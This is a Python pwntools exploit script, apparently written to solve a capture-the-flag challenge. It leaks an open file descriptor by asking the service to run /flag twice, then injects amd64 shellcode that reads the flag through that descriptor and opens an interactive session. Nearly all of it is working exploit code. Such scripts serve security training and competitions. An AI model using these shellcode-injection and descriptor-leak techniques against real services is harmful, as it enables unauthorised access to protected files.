import argparse
import time

from pwn import *
context.update(arch="amd64")

FLAG_FILE = b"/flag"

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")

args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))

def run_input(code: bytes):
    print(r.readuntil(b"Choice:"))
    r.sendline(b"1")
    r.sendlineafter(b"> ", b"/dev/stdin")
    time.sleep(0.1)
    r.send(code)
    r.sendline()


def run_file(fn: bytes):
    print(r.readuntil(b"Choice:"))
    r.sendline(b"1")
    r.sendlineafter(b"> ", fn)

run_file(FLAG_FILE) # Open, read, tries to run, fails
run_file(FLAG_FILE) # Opens file, tries to read, fails, leaves fd open

instrs = [
"mov rsi, [rbp-0x28]", # rsi contains address of result struct
"add rsi, 12", # rsi points to filename

# read from fd 5 to result struct filename
"xor rax, rax",
"mov rdi, 5",
"mov rdx, 64",
"syscall",
]

shellcode = asm('\n'.join(instrs))
run_input(shellcode)

time.sleep(1)
r.sendlineafter(b"Choice:", b"2")
r.interactive()
